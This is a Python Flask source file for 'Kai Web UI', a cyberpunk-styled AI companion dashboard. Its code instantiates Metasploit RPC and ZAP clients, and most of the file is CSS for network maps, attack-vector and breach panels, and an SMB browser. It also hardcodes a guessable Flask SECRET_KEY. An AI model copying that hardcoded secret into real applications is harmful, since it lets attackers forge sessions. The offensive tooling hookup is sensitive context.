#!/usr/bin/env python3
"""Kai Web UI — Flask + WebSocket AI companion interface."""

import json
import os
import queue
import subprocess
import sys
import threading
import time
from pathlib import Path

import flask

_root = Path(__file__).resolve().parent
if str(_root) not in sys.path:
    sys.path.insert(0, str(_root))

from kai_agent.companion_brain import KaiCompanion
from kai_agent.tools.msf_client import MsfRpcClient
from kai_agent.tools.zap_client import ZapClient

app = flask.Flask(__name__, static_folder=str(_root / "static"))
app.config["SECRET_KEY"] = "kai-companion-secret-2025"
clients: list[flask.sessions.SecureCookieSession] = []

# Singleton Kai instance (persists across requests)
_kai_instance = None

def get_kai():
    global _kai_instance
    if _kai_instance is None:
        _kai_instance = KaiCompanion(workspace=_root)
    return _kai_instance

# Tool client singletons
_msf_client = MsfRpcClient()
_zap_client = ZapClient()

def get_msf():
    return _msf_client

def get_zap():
    return _zap_client

# ── HTML ──────────────────────────────────────────────────────────────────────

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>K//AI — COMMAND DECK</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
:root{--cyan-bright:#00f0ff;--cyan-mid:#00b4d8;--cyan-dim:#0077b6;--bg-primary:#070b17;--bg-secondary:#0c1220;--text-primary:#e0f7fa;--text-secondary:#80deea;--text-dim:#4a6a7a;--accent-warn:#ff6b35;--accent-danger:#ff004d;--accent-success:#00ff88;--border-glow:rgba(0,240,255,0.12);--glow-sm:0 0 4px rgba(0,240,255,0.3);--glow-md:0 0 12px rgba(0,240,255,0.4);--glow-lg:0 0 24px rgba(0,240,255,0.3);--text-glow:0 0 8px rgba(0,240,255,0.5);--font-display:'Orbitron','Rajdhani',monospace;--font-body:'JetBrains Mono','Fira Code','Consolas',monospace;--font-ui:'Rajdhani','Segoe UI',sans-serif}
html,body{height:100%;overflow:hidden;background:var(--bg-primary);font-family:var(--font-ui);color:var(--text-primary)}body{display:flex;flex-direction:column}
#vignette{position:fixed;inset:0;pointer-events:none;z-index:9997;background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,0.7) 100%)}
#scanlines{position:fixed;inset:0;pointer-events:none;z-index:9998;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,240,255,0.008) 2px,rgba(0,240,255,0.008) 4px);animation:slMove 10s linear infinite}
@keyframes slMove{to{background-position:0 100px}}
#particles-canvas{position:fixed;inset:0;pointer-events:none;z-index:0}
#hud-bar{height:clamp(64px,8vh,96px);flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:8px clamp(16px,2.5vw,40px);border-bottom:1px solid var(--border-glow);background:rgba(7,11,23,0.8);backdrop-filter:blur(16px);position:relative;z-index:10}
#hud-bar::after{content:'';position:absolute;bottom:-1px;left:5%;right:5%;height:1px;background:linear-gradient(90deg,transparent,rgba(0,240,255,0.15),transparent)}
.hud-left{display:flex;align-items:center;gap:clamp(12px,2vw,24px)}
.hud-brand{font-family:var(--font-display);font-size:clamp(1rem,1.5vw,1.8rem);font-weight:700;letter-spacing:clamp(2px,.3vw,4px);color:var(--text-primary)}
.hud-brand span{color:var(--cyan-bright);text-shadow:var(--text-glow)}
.hud-status{display:flex;align-items:center;gap:8px;font-size:clamp(.7rem,.85vw,1rem);color:var(--text-secondary);letter-spacing:1px}
.hud-dot{width:6px;height:6px;border-radius:50%;background:var(--accent-success);box-shadow:0 0 8px var(--accent-success);animation:dotLife 2s ease-in-out infinite}
@keyframes dotLife{0%,100%{opacity:1}50%{opacity:0.4}}
.hud-gauges{display:flex;gap:clamp(16px,2.5vw,36px);align-items:center;flex-wrap:wrap}
.gauge{display:flex;align-items:center;gap:6px}
.gauge .gl{font-size:clamp(.6rem,.7vw,.85rem);color:var(--text-dim);letter-spacing:1px;text-transform:uppercase;font-family:var(--font-display)}
.gauge .gv{font-size:clamp(1.1rem,1.6vw,2rem);font-weight:700;font-family:var(--font-display);color:var(--text-primary);text-shadow:var(--text-glow);min-width:clamp(40px,5vw,64px);text-align:right}
.gauge .gb{width:clamp(40px,6vw,80px);height:4px;background:rgba(0,240,255,0.06);border-radius:2px;overflow:hidden}
.gauge .gb .f{height:100%;background:linear-gradient(90deg,var(--cyan-dim),var(--cyan-bright));border-radius:2px;transition:width .5s;box-shadow:0 0 6px rgba(0,240,255,.2)}
.hud-right{display:flex;align-items:center;gap:clamp(12px,1.5vw,24px)}
.hud-clock{font-family:var(--font-display);font-size:clamp(1.3rem,1.8vw,2.2rem);font-weight:700;color:var(--text-primary);text-shadow:var(--text-glow);letter-spacing:2px}
#main{flex:1;display:flex;overflow:hidden;position:relative;z-index:5}
#sidebar-left{width:clamp(180px,20vw,260px);min-width:clamp(180px,20vw,260px);border-right:1px solid var(--border-glow);background:rgba(7,11,23,0.6);backdrop-filter:blur(8px);display:flex;flex-direction:column;padding:clamp(6px,.8vh,12px) clamp(6px,.6vw,10px);gap:4px;flex-shrink:0;z-index:5;overflow-y:auto}
#sidebar-left::after{content:'';position:absolute;top:0;right:-1px;bottom:0;width:1px;background:linear-gradient(180deg,transparent,rgba(0,240,255,0.1),transparent)}
.sidebar-title{font-size:clamp(.6rem,.7vw,.85rem);color:var(--text-dim);letter-spacing:2px;text-transform:uppercase;padding:clamp(6px,.6vh,10px) 4px;font-family:var(--font-display);border-bottom:1px solid rgba(0,240,255,0.04);margin-bottom:6px}
.action-btn{display:flex;align-items:center;gap:8px;padding:clamp(8px,.9vh,14px) clamp(8px,.8vw,14px);background:rgba(0,240,255,0.02);border:1px solid rgba(0,240,255,0.06);border-radius:8px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden;flex-shrink:0}
.action-btn:hover{background:rgba(0,240,255,0.06);border-color:rgba(0,240,255,0.2);transform:translateX(2px);box-shadow:0 0 12px rgba(0,240,255,0.06)}
.action-btn:active{transform:scale(.97)}
.action-btn .ai{font-size:clamp(1.1rem,1.4vw,1.8rem);width:clamp(24px,2.5vw,32px);text-align:center;flex-shrink:0}
.action-btn .al{font-size:clamp(.8rem,1vw,1.2rem);color:var(--text-secondary);font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.action-btn .ac{font-size:clamp(.6rem,.7vw,.85rem);color:var(--accent-warn);margin-left:auto;display:none;font-family:var(--font-display)}
.action-btn.on-cd{opacity:.4;pointer-events:none}
.action-btn.on-cd .ac{display:block}
.action-btn.on-cd .al{color:var(--text-dim)}
.sidebar-footer{font-size:clamp(.4rem,.5vw,.6rem);color:var(--text-dim);text-align:center;padding:clamp(4px,.5vh,8px);border-top:1px solid rgba(0,240,255,0.03);margin-top:auto;letter-spacing:1px}
#center-stage{flex:1;display:flex;flex-direction:column;overflow:hidden;background:rgba(7,11,23,0.3)}
#tab-area{flex:1;display:flex;flex-direction:column;background:rgba(7,11,23,0.5);border-top:1px solid var(--border-glow);border-bottom:1px solid var(--border-glow)}
#map-bg{position:absolute;inset:0;background:radial-gradient(ellipse at 40% 30%,rgba(0,180,216,0.02),transparent 60%);pointer-events:none}
#map-grid{position:absolute;inset:0;pointer-events:none;opacity:.06;background-image:linear-gradient(rgba(0,240,255,.1) 1px,transparent 1px),linear-gradient(90deg,rgba(0,240,255,.1) 1px,transparent 1px);background-size:clamp(20px,3vw,40px) clamp(20px,3vw,40px);animation:gridMove 20s linear infinite}
@keyframes gridMove{to{transform:translate(clamp(20px,3vw,40px),clamp(20px,3vw,40px))}}
#map-svg{position:absolute;inset:0;width:100%;height:100%;z-index:2}
#map-nodes{position:absolute;inset:0;z-index:3}
.map-node{position:absolute;cursor:pointer;transition:transform .3s;z-index:3;transform:translate(-50%,-50%)}
.map-node:hover{transform:translate(-50%,-50%) scale(1.15);z-index:10}
.node-body{width:clamp(36px,4vw,52px);height:clamp(36px,4vw,52px);border-radius:clamp(6px,.6vw,10px);display:flex;align-items:center;justify-content:center;background:rgba(0,240,255,0.03);border:1px solid rgba(0,240,255,0.15);box-shadow:0 0 8px rgba(0,240,255,0.06),inset 0 0 12px rgba(0,240,255,0.02);backdrop-filter:blur(4px);transition:all .3s;position:relative;font-size:clamp(1rem,1.4vw,1.8rem)}
.map-node:hover .node-body{border-color:rgba(0,240,255,.6);box-shadow:0 0 20px rgba(0,240,255,.2),inset 0 0 20px rgba(0,240,255,.05)}
.node-body[data-type=router]{border-color:#ff6b35}
.node-body[data-type=server]{border-color:var(--cyan-bright)}
.node-body[data-type=switch]{border-color:var(--cyan-mid)}
.node-body[data-type=pc]{border-color:#80deea}
.node-body[data-type=laptop]{border-color:#80deea}
.node-body[data-type=camera]{border-color:var(--accent-danger)}
.node-body[data-type=nas]{border-color:var(--accent-success)}
.node-body[data-type=printer]{border-color:#ff6b35}
.node-body[data-type=phone]{border-color:#80deea}
.node-body[data-type=iot]{border-color:var(--text-dim)}
.node-body[data-type=wifi]{border-color:var(--cyan-mid)}
.node-body[data-type=cloud]{border-color:var(--text-dim)}
.node-label{font-size:clamp(.65rem,.8vw,1rem);color:var(--text-secondary);text-align:center;margin-top:6px;font-family:var(--font-body);letter-spacing:.5px;white-space:nowrap;pointer-events:none;text-shadow:0 0 4px rgba(0,0,0,.8)}
.node-ip{font-size:clamp(.5rem,.6vw,.72rem);color:var(--text-dim);text-align:center;font-family:var(--font-body);pointer-events:none}
.node-glow{position:absolute;inset:-8px;border-radius:clamp(8px,.8vw,14px);border:1px solid rgba(0,240,255,.06);animation:nodePulse 3s ease-in-out infinite;pointer-events:none}
@keyframes nodePulse{0%,100%{transform:scale(1);opacity:.3}50%{transform:scale(1.15);opacity:.6}}
#map-tooltip{position:absolute;z-index:50;pointer-events:none;opacity:0;transition:opacity .15s;background:rgba(7,11,23,.95);border:1px solid var(--border-glow);padding:clamp(6px,.6vw,10px) clamp(8px,.8vw,14px);border-radius:6px;font-size:clamp(.5rem,.6vw,.75rem);min-width:clamp(120px,14vw,180px)}
#map-tooltip.show{opacity:1}
#map-tooltip .tt-name{color:var(--cyan-bright);font-weight:600;font-size:clamp(.6rem,.7vw,.85rem);font-family:var(--font-display)}
#map-tooltip .tt-ip{color:var(--text-dim);font-family:var(--font-body);font-size:clamp(.45rem,.55vw,.65rem)}
#map-tooltip .tt-detail{color:var(--text-secondary);margin-top:4px;font-size:clamp(.4rem,.5vw,.6rem)}
#tab-area{flex:1;display:flex;flex-direction:column;background:rgba(7,11,23,0.5);min-height:0}
#tab-header{display:flex;gap:0;padding:0 clamp(8px,1vw,16px);border-bottom:1px solid var(--border-glow);flex-shrink:0;overflow-x:auto;scroll-behavior:smooth}
.tab-divider{display:inline-flex;align-items:center;flex-shrink:0;padding:0 4px;opacity:.25;color:var(--text-dim);font-size:.5rem;letter-spacing:0;user-select:none}
.tab-divider::after{content:'|';font-size:.6rem}
/* Pop-out button in tab header */
#popout-btn{flex-shrink:0;background:none;border:none;color:var(--text-dim);cursor:pointer;font-size:1rem;padding:0 10px;opacity:.4;transition:opacity .15s;display:flex;align-items:center;margin-left:auto}
#popout-btn:hover{opacity:1;color:var(--cyan-bright)}
.tab-btn{background:none;border:none;border-bottom:2px solid transparent;color:var(--text-dim);font-family:var(--font-ui);font-size:clamp(.7rem,.8vw,1rem);letter-spacing:1px;padding:clamp(6px,.6vh,10px) clamp(12px,1.2vw,20px);cursor:pointer;text-transform:uppercase;transition:all .15s;font-weight:600;white-space:nowrap}
.tab-btn:hover{color:var(--text-secondary)}
.tab-btn.active{color:var(--cyan-bright);border-bottom-color:var(--cyan-bright);text-shadow:var(--text-glow)}
.tab-panel{flex:1;overflow-y:auto;padding:clamp(10px,1vh,18px) clamp(14px,1.5vw,24px);display:none;position:relative}
.tab-panel.active{display:block}
#tp-chat{display:none;flex-direction:column}
#tp-chat.active{display:flex}
#tp-chat #chat-log{flex:1;overflow-y:auto;padding-bottom:8px}
#tp-chat #chat-input-row{flex-shrink:0}
.tab-panel .term-line{font-family:var(--font-body);font-size:clamp(.8rem,.95vw,1.15rem);line-height:1.9;white-space:pre-wrap;word-break:break-all;opacity:0;animation:tlFade .12s forwards}
@keyframes tlFade{to{opacity:1}}
.tab-panel .term-line .tt{color:var(--text-dim);margin-right:6px}
.tab-panel .term-line .tok{color:var(--accent-success)}
.tab-panel .term-line .tinfo{color:var(--text-secondary)}
.tab-panel .term-line .twarn{color:var(--accent-warn)}
.tab-panel .term-line .terr{color:var(--accent-danger)}
.tab-panel .term-line .tcmd{color:var(--cyan-bright)}
#map-panel{width:clamp(240px,28vw,380px);min-width:clamp(240px,28vw,380px);border-left:1px solid var(--border-glow);background:rgba(7,11,23,0.6);backdrop-filter:blur(8px);display:flex;flex-direction:column;flex-shrink:0;z-index:5;transition:width .3s,min-width .3s}
#map-panel.collapsed{width:44px;min-width:44px;cursor:pointer}
#map-panel.collapsed #mp-body{display:none}
#map-panel.collapsed #mp-toggle{transform:rotate(180deg);margin:0 auto}
#map-panel.collapsed #mp-title{display:none}
#map-panel::before{content:'';position:absolute;top:0;left:-1px;bottom:0;width:1px;background:linear-gradient(180deg,transparent,rgba(0,240,255,0.1),transparent)}
#map-panel-header{flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:clamp(6px,.6vh,10px) clamp(8px,.8vw,14px);border-bottom:1px solid var(--border-glow);background:rgba(0,240,255,0.02)}
#mp-title{font-family:var(--font-display);font-size:clamp(.6rem,.7vw,.85rem);color:var(--cyan-bright);letter-spacing:2px;text-shadow:var(--text-glow)}
#mp-toggle{background:none;border:1px solid rgba(0,240,255,0.12);color:var(--text-dim);cursor:pointer;font-size:clamp(.6rem,.7vw,.8rem);padding:2px 8px;border-radius:4px;transition:all .15s}
#mp-toggle:hover{color:var(--cyan-bright);border-color:rgba(0,240,255,0.2)}
#mp-body{flex:1;display:flex;flex-direction:column;overflow:hidden}
#mp-gauges{display:flex;gap:clamp(4px,.5vw,8px);padding:clamp(4px,.4vh,8px) clamp(6px,.6vw,10px);border-bottom:1px solid var(--border-glow);flex-shrink:0;flex-wrap:wrap}
.mp-g{display:flex;align-items:center;gap:4px}
.mp-gl{font-size:clamp(.45rem,.5vw,.6rem);color:var(--text-dim);font-family:var(--font-display);letter-spacing:1px}
.mp-gv{font-size:clamp(.7rem,.8vw,1rem);font-weight:700;font-family:var(--font-display);color:var(--cyan-bright);text-shadow:var(--text-glow)}
#mp-sidebar{flex-shrink:0;max-height:clamp(80px,12vh,160px);overflow-y:auto;padding:clamp(4px,.4vh,8px) clamp(6px,.6vw,10px);border-top:1px solid var(--border-glow)}
.mp-section{margin-bottom:clamp(6px,.5vh,10px)}
.mp-sect-title{font-size:clamp(.48rem,.55vw,.65rem);color:var(--text-dim);letter-spacing:2px;text-transform:uppercase;padding-bottom:4px;font-family:var(--font-display);border-bottom:1px solid rgba(0,240,255,0.04);margin-bottom:4px}
#map-container{flex:1;position:relative;overflow:hidden;min-height:0}
.result-item{font-size:clamp(.5rem,.6vw,.7rem);padding:clamp(4px,.3vh,6px) clamp(6px,.5vw,10px);color:var(--text-dim);border-bottom:1px solid rgba(0,240,255,0.02);font-family:var(--font-body)}
.result-item .rt{color:var(--text-dim);margin-right:6px}
.result-item.success{color:var(--accent-success)}
.result-item.warn{color:var(--accent-warn)}
.result-item.alert{color:var(--accent-danger)}
#term-status-bar{display:none;flex-shrink:0;align-items:center;gap:6px;padding:clamp(3px,.3vh,6px) clamp(6px,.5vw,10px);border-top:1px solid rgba(0,240,255,0.04);font-size:clamp(.5rem,.55vw,.65rem);color:var(--text-dim);font-family:var(--font-body)}
#term-status-bar .ts-text{flex:1;color:var(--accent-warn)}
#term-status-bar .ts-cancel{background:none;border:1px solid rgba(255,0,77,0.2);color:var(--accent-danger);cursor:pointer;padding:2px 8px;border-radius:4px;font-size:clamp(.45rem,.5vw,.6rem);transition:all .15s}
#term-status-bar .ts-cancel:hover{background:rgba(255,0,77,0.1);border-color:rgba(255,0,77,0.4)}
#chat-input-row{display:flex;gap:8px;padding:clamp(6px,.5vh,10px) 0 0;border-top:1px solid rgba(0,240,255,0.04);margin-top:6px;flex-shrink:0}
#chat-input{flex:1;background:rgba(0,0,0,0.3);border:1px solid rgba(0,240,255,0.08);color:var(--text-primary);padding:clamp(8px,.7vh,14px) clamp(10px,1vw,16px);font-family:var(--font-body);font-size:clamp(.65rem,.8vw,.95rem);outline:none;resize:none;border-radius:6px}
#chat-input:focus{border-color:rgba(0,240,255,0.2)}
#chat-send{padding:clamp(8px,.7vh,14px) clamp(14px,1.5vw,24px);background:rgba(0,240,255,0.08);border:1px solid rgba(0,240,255,0.15);color:var(--cyan-bright);font-family:var(--font-ui);font-size:clamp(.65rem,.8vw,.95rem);cursor:pointer;border-radius:6px;font-weight:600;transition:all .15s}
#chat-send:hover{background:rgba(0,240,255,0.15)}
#status-bar{height:clamp(28px,3.5vh,40px);flex-shrink:0;display:flex;align-items:center;gap:clamp(12px,2vw,24px);padding:0 clamp(8px,.8vw,16px);border-top:1px solid var(--border-glow);background:rgba(7,11,23,0.8);font-size:clamp(.5rem,.6vw,.7rem);color:var(--text-dim);letter-spacing:1px;position:relative;z-index:10;font-family:var(--font-display);overflow:hidden}
#status-bar .sb{display:flex;align-items:center;gap:4px}
/* Hide scrollbars globally — scrolling still works via wheel/touch/keyboard */
*{scrollbar-width:none!important;-ms-overflow-style:none!important}
*::-webkit-scrollbar{width:0!important;height:0!important}
#dp-overlay{position:fixed;inset:0;z-index:49;background:rgba(0,0,0,0.5);display:none;backdrop-filter:blur(2px)}
#dp-overlay.show{display:block}
#device-panel{position:fixed;top:0;right:0;bottom:0;width:clamp(380px,35vw,520px);z-index:50;background:rgba(7,11,23,0.97);border-left:1px solid var(--border-glow);display:flex;flex-direction:column;transform:translateX(100%);transition:transform .3s cubic-bezier(.16,1,.3,1);box-shadow:-8px 0 32px rgba(0,0,0,0.5)}
#device-panel.show{transform:translateX(0)}
#dp-header{flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:clamp(8px,.8vh,12px) clamp(12px,1.2vw,16px);border-bottom:1px solid var(--border-glow);background:rgba(0,240,255,0.02)}
#dp-title{font-family:var(--font-display);font-size:clamp(.6rem,.7vw,.85rem);color:var(--cyan-bright);letter-spacing:3px;text-shadow:var(--text-glow)}
#dp-close{background:none;border:1px solid rgba(0,240,255,0.15);color:var(--text-dim);cursor:pointer;font-size:clamp(.7rem,.8vw,1rem);padding:2px 8px;border-radius:4px;transition:all .15s}
#dp-close:hover{color:var(--accent-danger);border-color:rgba(255,0,77,0.3)}
#dp-body{flex:1;overflow-y:auto;padding:clamp(8px,.8vh,12px) clamp(12px,1.2vw,16px)}
#dp-summary{display:flex;flex-direction:column;gap:clamp(2px,.2vh,4px);margin-bottom:clamp(10px,1vh,16px)}
.dp-row{display:flex;justify-content:space-between;padding:clamp(4px,.3vh,6px) 0;border-bottom:1px solid rgba(0,240,255,0.03);font-size:clamp(.65rem,.8vw,.95rem)}
.dp-label{color:var(--text-dim);font-family:var(--font-display);letter-spacing:1px;text-transform:uppercase}
.dp-val{color:var(--text-secondary);font-family:var(--font-body);text-align:right;max-width:60%;overflow:hidden;text-overflow:ellipsis}
.dp-section-title{font-family:var(--font-display);font-size:clamp(.5rem,.6vw,.72rem);color:var(--cyan-bright);letter-spacing:2px;padding:clamp(6px,.6vh,10px) 0 clamp(4px,.4vh,6px);border-bottom:1px solid var(--border-glow);margin-bottom:clamp(4px,.4vh,6px);text-shadow:var(--text-glow)}
#dp-ports{display:flex;flex-direction:column;gap:2px;margin-bottom:clamp(10px,1vh,16px)}
.dp-port{display:flex;justify-content:space-between;padding:clamp(5px,.4vh,8px) clamp(8px,.8vw,14px);background:rgba(0,240,255,0.02);border:1px solid rgba(0,240,255,0.04);border-radius:4px;font-size:clamp(.6rem,.7vw,.85rem);font-family:var(--font-body)}
.dp-port .pp{color:var(--cyan-bright)}
.dp-port .ps{color:var(--text-secondary)}
.dp-port .psvc{color:var(--text-dim);font-size:clamp(.42rem,.5vw,.6rem)}
#dp-vectors{display:flex;flex-direction:column;gap:clamp(4px,.4vh,8px);margin-bottom:clamp(10px,1vh,16px)}
.dp-vector{display:flex;align-items:center;gap:clamp(6px,.6vw,10px);padding:clamp(6px,.6vh,10px) clamp(8px,.8vw,12px);background:rgba(255,107,53,0.04);border:1px solid rgba(255,107,53,0.12);border-radius:6px;font-size:clamp(.48rem,.55vw,.68rem);cursor:pointer;transition:all .15s}
.dp-vector:hover{background:rgba(255,107,53,0.08);border-color:rgba(255,107,53,0.25);transform:translateX(3px)}
.dp-vector .vi{font-size:clamp(.7rem,.8vw,1rem);color:var(--accent-warn)}
.dp-vector .vn{color:var(--text-secondary);font-weight:600}
.dp-vector .vd{color:var(--text-dim);font-size:clamp(.4rem,.48vw,.58rem)}
#dp-breach{display:flex;flex-direction:column;gap:3px;margin-bottom:clamp(10px,1vh,16px)}
.dp-breach-item{padding:clamp(4px,.4vh,6px) clamp(6px,.6vw,10px);background:rgba(255,0,77,0.03);border:1px solid rgba(255,0,77,0.08);border-radius:4px;font-size:clamp(.42rem,.5vw,.6rem);color:var(--text-dim);font-family:var(--font-body)}
@media(max-width:1100px){
  #sidebar-left{width:clamp(60px,14vw,100px);min-width:clamp(60px,14vw,100px)}
  #sidebar-left .al{display:none}
  .action-btn{padding:clamp(6px,.6vh,10px);justify-content:center}
  #map-panel{width:clamp(200px,22vw,280px);min-width:clamp(200px,22vw,280px)}
  #device-panel{width:clamp(280px,80vw,380px)}
}
/* ── Boot Screen ── */
#boot-screen{position:fixed;inset:0;z-index:9999;background:var(--bg-primary);display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:var(--font-display);transition:opacity .6s;overflow:hidden}
#boot-screen.hidden{opacity:0;pointer-events:none}
#boot-screen .bs-line{font-size:clamp(.7rem,.9vw,1.1rem);color:var(--cyan-dim);letter-spacing:3px;opacity:0;animation:bsFadeIn .4s forwards;font-family:var(--font-body)}
#boot-screen .bs-line .highlight{color:var(--cyan-bright);text-shadow:var(--text-glow)}
#boot-screen .bs-logo{font-size:clamp(2rem,4vw,5rem);color:var(--cyan-bright);text-shadow:0 0 30px rgba(0,240,255,.4);letter-spacing:8px;margin-bottom:20px;opacity:0;animation:bsFadeIn .6s forwards}
#boot-screen .bs-bar{width:clamp(120px,20vw,300px);height:2px;background:rgba(0,240,255,.06);border-radius:2px;margin-top:16px;overflow:hidden;opacity:0;animation:bsFadeIn .4s .6s forwards}
#boot-screen .bs-bar .f{height:100%;width:0;background:linear-gradient(90deg,var(--cyan-dim),var(--cyan-bright));border-radius:2px;animation:bsLoad 2s ease-in-out forwards;box-shadow:0 0 12px rgba(0,240,255,.2)}
@keyframes bsFadeIn{to{opacity:1}}
@keyframes bsLoad{0%{width:0}30%{width:35%}60%{width:65%}100%{width:100%}}
/* ── Toast Container ── */
#toast-container{position:fixed;top:clamp(64px,8vh,88px);right:clamp(12px,1.5vw,20px);z-index:100;display:flex;flex-direction:column;gap:6px;pointer-events:none;max-width:clamp(240px,28vw,360px)}
.toast{padding:clamp(6px,.6vh,10px) clamp(10px,1vw,14px);background:rgba(7,11,23,.95);border:1px solid var(--border-glow);border-left:3px solid var(--cyan-bright);border-radius:4px;font-size:clamp(.48rem,.55vw,.68rem);color:var(--text-secondary);font-family:var(--font-body);transform:translateX(120%);opacity:0;transition:all .3s cubic-bezier(.16,1,.3,1);pointer-events:auto;box-shadow:0 4px 20px rgba(0,0,0,.4);position:relative}
.toast.show{transform:translateX(0);opacity:1}
.toast .tt{font-family:var(--font-display);font-size:clamp(.45rem,.5vw,.6rem);color:var(--text-dim);letter-spacing:1px}
.toast .tm{color:var(--text-secondary);margin-top:2px}
.toast.alert{border-left-color:var(--accent-danger)}
.toast.alert .tt{color:var(--accent-danger)}
.toast.warn{border-left-color:var(--accent-warn)}
.toast.warn .tt{color:var(--accent-warn)}
.toast.success{border-left-color:var(--accent-success)}
.toast.success .tt{color:var(--accent-success)}
/* ── Process Tree ── */
.proc-tree{font-family:var(--font-body);font-size:clamp(.45rem,.52vw,.65rem)}
.proc-node{cursor:pointer;padding:2px 0;display:flex;align-items:center;gap:6px;color:var(--text-secondary);transition:color .1s}
.proc-node:hover{color:var(--cyan-bright)}
.proc-node .pt{color:var(--text-dim);font-size:clamp(.4rem,.48vw,.58rem);min-width:clamp(30px,3.5vw,48px);text-align:right}
.proc-node .pn{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.proc-node .pm{color:var(--text-dim);min-width:clamp(36px,4vw,54px);text-align:right;font-size:clamp(.4rem,.48vw,.58rem)}
.proc-children{padding-left:clamp(12px,1.5vw,20px);border-left:1px solid rgba(0,240,255,.04);margin-left:clamp(4px,.4vw,8px)}
.proc-toggle{display:inline-block;width:clamp(10px,1vw,14px);text-align:center;color:var(--text-dim);font-size:clamp(.4rem,.48vw,.58rem);flex-shrink:0}
/* ── Service Table ── */
.svc-table{width:100%;border-collapse:collapse;font-family:var(--font-body);font-size:clamp(.55rem,.65vw,.8rem)}
.svc-table th{text-align:left;padding:clamp(6px,.5vh,10px) clamp(8px,.8vw,14px);color:var(--text-dim);font-family:var(--font-display);letter-spacing:1px;border-bottom:1px solid var(--border-glow);font-weight:400;font-size:clamp(.5rem,.6vw,.72rem);position:sticky;top:0;background:rgba(7,11,23,.98)}
.svc-table td{padding:clamp(5px,.4vh,8px) clamp(8px,.8vw,14px);border-bottom:1px solid rgba(0,240,255,.03);color:var(--text-secondary)}
.svc-table tr:hover td{background:rgba(0,240,255,.03)}
.svc-table .s-running{color:var(--accent-success)}
.svc-table .s-stopped{color:var(--accent-danger)}
.svc-table .s-auto{color:var(--cyan-bright)}
.svc-table .s-manual{color:var(--accent-warn)}
.svc-table .s-disabled{color:var(--text-dim)}
.svc-btn{background:none;border:1px solid rgba(0,240,255,.1);color:var(--text-secondary);padding:3px 10px;border-radius:4px;cursor:pointer;font-size:clamp(.5rem,.6vw,.7rem);font-family:var(--font-body);transition:all .1s}
.svc-btn:hover{background:rgba(0,240,255,.08);border-color:rgba(0,240,255,.2)}
.svc-btn.danger:hover{background:rgba(255,0,77,.1);border-color:rgba(255,0,77,.2);color:var(--accent-danger)}
.svc-search{padding:clamp(6px,.5vh,10px) clamp(8px,.8vw,14px);background:rgba(0,0,0,.3);border:1px solid var(--border-glow);color:var(--text-primary);font-family:var(--font-body);font-size:clamp(.5rem,.6vw,.7rem);border-radius:4px;outline:none;width:100%;margin-bottom:clamp(6px,.5vh,10px)}
.svc-search:focus{border-color:rgba(0,240,255,.2)}
/* ── SMB Browser ── */
.smb-share{padding:clamp(8px,.7vh,14px) clamp(10px,1vw,16px);background:rgba(0,240,255,.02);border:1px solid rgba(0,240,255,.04);border-radius:6px;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center}
.smb-share .sn{color:var(--text-secondary);font-family:var(--font-display);font-size:clamp(.6rem,.7vw,.85rem)}
.smb-share .sp{color:var(--text-dim);font-size:clamp(.5rem,.6vw,.7rem);font-family:var(--font-body)}
.smb-share .su{color:var(--text-dim);font-size:clamp(.48rem,.55vw,.65rem)}
.smb-remote-row{display:flex;gap:8px;margin-bottom:clamp(8px,.7vh,12px)}
.smb-remote-row input{flex:1;background:rgba(0,0,0,.3);border:1px solid var(--border-glow);color:var(--text-primary);padding:clamp(6px,.5vh,10px) clamp(8px,.8vw,14px);font-family:var(--font-body);font-size:clamp(.5rem,.6vw,.7rem);border-radius:4px;outline:none}
.smb-remote-row input:focus{border-color:rgba(0,240,255,.2)}
.smb-remote-row button{padding:clamp(6px,.5vh,10px) clamp(14px,1.5vw,20px);background:rgba(0,240,255,.08);border:1px solid rgba(0,240,255,.1);color:var(--cyan-bright);border-radius:4px;cursor:pointer;font-family:var(--font-ui);font-size:clamp(.5rem,.6vw,.7rem)}
.smb-remote-row button:hover{background:rgba(0,240,255,.15)}
/* ── Watchdog Cards ── */
.wd-card{padding:clamp(8px,.7vh,14px);background:rgba(0,240,255,.02);border:1px solid var(--border-glow);border-radius:6px;margin-bottom:6px;display:flex;flex-direction:column;gap:4px}
.wd-card .wdh{display:flex;justify-content:space-between;align-items:center}
.wd-card .wdn{color:var(--text-secondary);font-family:var(--font-display);font-size:clamp(.6rem,.7vw,.85rem);letter-spacing:1px}
.wd-card .wdt{font-size:clamp(.5rem,.6vw,.7rem);color:var(--text-dim);font-family:var(--font-body)}
.wd-card .wds{font-size:clamp(.5rem,.6vw,.7rem);color:var(--text-dim)}
.wd-card .wd-action{background:none;border:1px solid rgba(255,0,77,.1);color:var(--accent-danger);padding:1px 6px;border-radius:3px;cursor:pointer;font-size:clamp(.38rem,.45vw,.55rem);font-family:var(--font-body)}
.wd-card .wd-action:hover{background:rgba(255,0,77,.1)}
.wd-card .wd-triggered{border-left:3px solid var(--accent-danger);background:rgba(255,0,77,.03)}
.wd-add-row{display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap}
.wd-add-row select,.wd-add-row input{background:rgba(0,0,0,.3);border:1px solid var(--border-glow);color:var(--text-primary);padding:clamp(6px,.5vh,10px) clamp(8px,.8vw,14px);font-family:var(--font-body);font-size:clamp(.55rem,.65vw,.8rem);border-radius:6px;outline:none;flex:1;min-width:80px}
.wd-add-row select option{background:var(--bg-primary)}
